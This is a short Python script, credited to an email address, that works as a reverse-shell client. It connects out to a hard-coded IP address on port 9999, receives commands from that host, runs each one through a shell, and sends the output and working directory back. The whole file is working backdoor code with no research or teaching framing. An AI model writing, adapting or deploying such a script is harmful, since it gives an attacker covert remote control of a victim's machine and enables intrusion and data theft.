#!/usr/bin/env python3
# Python all
# -*- coding: utf-8 -*-
# made by  Xtr3am3r.0k@gmail.com
import os
import subprocess
from socket import socket, AF_INET, SOCK_STREAM


myHOST = '192.168.44.128'
myPORT = 9999
def client():
    sockobj = socket(AF_INET, SOCK_STREAM)
    sockobj.connect((myHOST, myPORT))

    while True:
        output = ''
        data = (sockobj.recv(1024)).decode()
        if data[:2] == 'cd':
            try:
                os.chdir(data[3:])
            except:
                output += 'enter cd error'

        if len(data) > 0:
            cmd = subprocess.Popen(data[:], shell=True,
                                   stdout=subprocess.PIPE,
                                   stderr=subprocess.PIPE,
                                   stdin=subprocess.PIPE)
            output = (cmd.stdout.read() + cmd.stderr.read())
            sockobj.send((output + (os.getcwd() + '> ').encode('utf-8', errors='ignore')))
    sockobj.close()

client()
